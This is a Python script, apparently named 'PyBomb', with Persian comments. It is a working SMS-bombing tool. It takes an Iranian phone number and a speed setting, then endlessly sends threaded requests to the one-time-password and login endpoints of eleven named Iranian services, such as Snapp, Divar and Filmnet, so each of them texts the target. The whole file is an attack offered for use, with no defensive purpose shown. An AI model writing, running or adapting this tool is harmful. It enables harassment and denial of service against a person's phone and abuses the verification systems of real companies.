import requests
import os
import time
import sys
import threading
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor

# 📌 تابع نمایش متن انیمیشنی
def animated_text(text, delay=0.1):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

os.system('clear')

# 🎬 نمایش پیام خوش‌آمدگویی با انیمیشن
animated_text(colored("Welcome to PyBomb!", 'yellow'), 0.02)
animated_text(colored("Version 1.1 Alpha, Created by T7280H", 'yellow'), 0.02)
animated_text(colored("Enter your number (+98): ", 'blue'), 0.02)

# 📞 دریافت شماره از کاربر
phone = input()

# 🛠️ تبدیل شماره به فرمت مناسب
formatted_phone = phone if phone.startswith("+98") else "+98" + phone

# 🚀 انتخاب سرعت ارسال
animated_text("\nChoose Speed:", 0.02)
animated_text(colored("[1] Slow (1 SMS every 5 sec)", 'green'), 0.02)
animated_text(colored("[2] Medium (1 SMS every 2 sec)", 'green'), 0.02)
animated_text(colored("[3] Fast (1 SMS every 0.5 sec)", 'green'), 0.02)
animated_text(colored("[4] Crazy Mode (No Delay)", 'green'), 0.02)

speed_choice = input("\nEnter your choice (1-4): ")

# 🕒 تنظیم تأخیر بر اساس انتخاب کاربر
speed_map = {
    "1": 5,    # کند
    "2": 2,    # متوسط
    "3": 0.5,  # سریع
    "4": 0     # بدون توقف
}
delay = speed_map.get(speed_choice, 2)  # مقدار پیش‌فرض: متوسط (۲ ثانیه)

# 📡 تابع عمومی برای ارسال درخواست‌ها
def send_sms_request(url, headers, data, success_message, error_message):
    try:
        response = requests.post(url, json=data, headers=headers, timeout=5)
        if response.status_code == 200:
            print(colored(f"[✔] {success_message}", 'green'))
        else:
            print(colored(f"[✘] {error_message}: {response.text}", 'red'))
    except requests.exceptions.RequestException as e:
        print(colored(f"[✘] Error: {e}", 'red'))

# 📡 تابع API برای هر سرویس
def snap(phone):
    url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0"}
    data = {"cellphone": phone}
    send_sms_request(url, headers, data, f"SMS sent to {phone} via Snapp", "Snapp Error")

def divar(phone):
    url = "https://api.divar.ir/v5/auth/authenticate"
    headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0"}
    data = {"phone": phone.split("+98")[1]}
    send_sms_request(url, headers, data, f"SMS sent to {phone} via Divar", "Divar Error")

def tap30(phone):
    url = "https://tap33.me/api/v2/user"
    headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0"}
    data = {"credential": {"phoneNumber": "0" + phone.split("+98")[1], "role": "PASSENGER"}}
    send_sms_request(url, headers, data, f"SMS sent to {phone} via Tapsi", "Tapsi Error")

def sheypoor(phone):
    url = "https://www.sheypoor.com/auth"
    headers = {"content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0"}
    data = {"username": "0" + phone.split("+98")[1]}
    send_sms_request(url, headers, data, f"SMS sent to {phone} via Sheypoor", "Sheypoor Error")

def gap(phone):
    url = f"https://core.gap.im/v1/user/add.json?mobile=%2B{phone.split('+')[1]}"
    headers = {"Host": "core.gap.im", "accept": "application/json", "user-agent": "Mozilla/5.0"}
    send_sms_request(url, headers, {}, f"SMS sent to {phone} via Gap", "Gap Error")

def okorosh(phone):
    url = f"https://my.okcs.com/api/check-mobile"
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    data = {"mobile": phone}
    send_sms_request(url, headers, data, f"SMS sent to {phone} via Okorosh", "Okorosh Error")

def filmnet(phone):
    url = f"https://api-v2.filmnet.ir/access-token/users/{phone}/otp"
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    send_sms_request(url, headers, {}, f"SMS sent to {phone} via Filmnet", "Filmnet Error")

def drdr(phone):
    url = "https://drdr.ir/api/registerEnrollment/sendDisposableCode"
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    data = {"phone": phone}
    send_sms_request(url, headers, data, f"SMS sent to {phone} via DRDR", "DRDR Error")

def itoll(phone):
    url = "https://app.itoll.ir/api/v1/auth/login"
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    data = {"phone": phone}
    send_sms_request(url, headers, data, f"SMS sent to {phone} via Itoll", "Itoll Error")

def azki(phone):
    url = f"https://www.azki.com/api/core/app/user/checkLoginAvailability/{phone}"
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    send_sms_request(url, headers, {}, f"SMS sent to {phone} via Azki", "Azki Error")

def nobat(phone):
    url = "https://nobat.ir/api/public/patient/login/phone"
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    data = {"phone": phone}
    send_sms_request(url, headers, data, f"SMS sent to {phone} via Nobat", "Nobat Error")

# 🚀 اجرای ارسال پیامک‌ها با تأخیر انتخاب‌شده
def start_attack():
    with ThreadPoolExecutor(max_workers=20) as executor:  # افزایش تعداد نخ‌ها به 20 برای کارایی بیشتر
        while True:
            executor.submit(snap, formatted_phone)
            executor.submit(divar, formatted_phone)
            executor.submit(tap30, formatted_phone)
            executor.submit(sheypoor, formatted_phone)
            executor.submit(gap, formatted_phone)
            executor.submit(okorosh, formatted_phone)
            executor.submit(filmnet, formatted_phone)
            executor.submit(drdr, formatted_phone)
            executor.submit(itoll, formatted_phone)
            executor.submit(azki, formatted_phone)
            executor.submit(nobat, formatted_phone)

            time.sleep(delay)  # ⏳ تأخیر بین درخواست‌ها

# ⏳ اجرای بمباران در یک نخ جداگانه
threading.Thread(target=start_attack).start()

animated_text(colored("\n[✔] SMS Bombing Started! Press Ctrl+C to Stop.", 'yellow'), 0.05)